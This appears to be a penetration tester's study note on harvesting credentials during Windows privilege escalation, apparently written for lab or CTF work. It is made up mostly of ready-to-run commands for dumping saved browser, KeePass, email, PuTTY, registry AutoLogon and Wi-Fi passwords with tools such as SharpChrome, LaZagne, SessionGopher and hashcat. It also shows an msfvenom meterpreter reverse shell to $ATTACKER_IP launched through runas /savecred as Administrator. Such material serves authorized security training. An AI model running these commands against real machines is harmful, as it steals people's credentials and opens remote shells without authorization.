
# <span style="color:#FF5555">Search Application Config Files for Passwords</span>
Many applications store passwords in config files in plain text (bad practice)
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

# <span style="color:#FF5555">Check Chrome Custom Dictionary for Passwords</span>
Users might save passwords or secrets as custom dictionary entries.
```powershell
Get-Content "C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt" | Select-String "password"
```
- Replace `<username>` with the actual Windows user.
- This reads the dictionary file and searches for the word "password".

# <span style="color:#FF5555">Cmdkey Saved Credentials</span>
Windows stores saved usernames and passwords for things like Remote Desktop connections.

```bash
# List saved credentials:
cmdkey /list

# create a reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ATTACKER_IP LPORT=4747 -f exe -o oscpp.exe

# run the reverse
runas /savecred /user:Access\\Administrator C:\\PrivEsc\\oscpp.exe

# copy flag as logged in user
runas /user:Access\\Administrator /savecred "cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\security\\Desktop\\flag.txt"
```
![[Pasted image 20250828064001.png]]

# <span style="color:#FF5555">Browser Credentials (Chrome)</span>
Users often save passwords in their browsers.

Extract saved Chrome passwords with SharpChrome:

```powershell
.\SharpChrome.exe logins /unprotect
```

This displays usernames and passwords saved in Chrome for the current user.

# <span style="color:#FF5555">Password Managers (KeePass)</span>
Password managers like KeePass store multiple passwords securely but can sometimes be cracked.

Extract KeePass hash from .kdbx file:

```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
```

Crack the hash with Hashcat (mode 13400 for KeePass):

```bash
hashcat -m 13400 keepass_hash.txt /path/to/rockyou.txt
```

If cracked, you get access to many stored passwords for important systems.

### <span style="color:#50FA7B">4. Searching Emails for Passwords</span>
If you have access to a user's email inbox (Microsoft Exchange), you can search for passwords or credentials.

Example command with MailSniper:

```bash
MailSniper -search "password" -search "credential"
```

### <span style="color:#50FA7B">5. Extracting Credentials with LaZagne</span>
LaZagne can extract stored passwords from many applications.

View help menu:

```powershell
.\lazagne.exe -h
```

Run all modules to extract any saved credentials:

```powershell
.\lazagne.exe all
```

This attempts to find and display cleartext passwords saved by browsers, chat clients, databases, and more.

### <span style="color:#50FA7B">6. Extract Remote Access Credentials with SessionGopher</span>
SessionGopher finds saved login info for remote tools like PuTTY, WinSCP, and RDP.

Import the module in PowerShell:

```powershell
Import-Module .\SessionGopher.ps1
```

Run it against a target host:

```powershell
Invoke-SessionGopher -Target WINLPE-SRV01
```

You’ll get decrypted saved session info like usernames and passwords.

### <span style="color:#50FA7B">7. Cleartext Passwords in Registry - Windows AutoLogon</span>
Windows AutoLogon stores username and password in the registry for automatic login.

Check AutoLogon registry keys:

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for:

AutoAdminLogon (1 means enabled)

DefaultUserName (username)

DefaultPassword (password in cleartext)

Note: Using Autologon.exe from Sysinternals encrypts the password and is safer.

### <span style="color:#50FA7B">8. PuTTY Sessions Stored in Registry</span>
PuTTY saves session info including proxy credentials in the registry.

List saved PuTTY sessions:

```bash
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

View specific session details:

```bash
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions<SESSION_NAME>"
```

Look for ProxyUsername and ProxyPassword which may be stored in cleartext.

### <span style="color:#50FA7B">9. Wi-Fi Passwords</span>
If you have admin access on a Windows machine with Wi-Fi, you can list saved wireless networks and their passwords.

List saved Wi-Fi profiles:

```bash
netsh wlan show profile
```

Show details and password of a profile:

```bash
netsh wlan show profile <profile-name> key=clear
```

The password will appear under Key Content.

